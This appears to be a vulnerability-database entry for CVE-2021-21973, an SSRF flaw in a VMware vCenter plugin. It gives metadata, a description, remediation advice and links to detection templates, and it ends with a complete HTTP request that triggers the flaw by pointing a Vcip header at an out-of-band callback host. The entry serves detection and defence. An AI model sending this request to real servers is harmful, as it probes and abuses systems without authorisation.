---
layout: post
cve_id: CVE-2021-21973
title: VMware vSphere - Server-Side Request Forgery
pcap: true
pcap_path: /pcaps/2021/CVE-2021-21973.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-21973.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pdteam
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  send arbitrary requests from the vulnerable server, potentially leading to unauthorized
  access, data leakage, or further attacks.

  '
remediation: 'Apply the necessary security patches or updates provided by VMware to
  mitigate this vulnerability.

  '
reference:
- https://twitter.com/osama_hroot/status/1365586206982082560
- https://twitter.com/bytehx343/status/1486582542807420928
- https://www.vmware.com/security/advisories/VMSA-2021-0002.html
- https://nvd.nist.gov/vuln/detail/CVE-2021-21973
- https://github.com/soosmile/POC
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
  cvss-score: 5.3
  cve-id: CVE-2021-21973
  cwe-id: CWE-918
  epss-score: 0.90336
  epss-percentile: 0.99578
  cpe: cpe:2.3:a:vmware:cloud_foundation:*:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: vmware
  product: cloud_foundation
tags:
- cve2021
- cve
- vmware
- ssrf
- vcenter
- oast
- kev
- vkev
- vuln
---

## üîç Vulnerability Description
VMware vSphere (HTML5) is susceptible to server-side request forgery due to improper validation of URLs in a vCenter Server plugin. An attacker with network access to port 443 can exploit this issue by sending a POST request to the plugin. This affects VMware vCenter Server (7.x before 7.0 U1c, 6.7 before 6.7 U3l, and 6.5 before 6.5 U3n) and VMware Cloud Foundation (4.x before 4.2 and 3.x before 3.10.1.2).

## üåê HTTP Request
```nohighlight
GET /ui/vropspluginui/rest/services/getvcdetails HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Connection: close
Reqresource: vCj5gv
Vcip: d5jn6qple0o4s5601n8gkxd6d97fh89n5.oast.fun
Vcpassword: IhxUBq
Vcusername: yLxXHx
Accept-Encoding: gzip
```

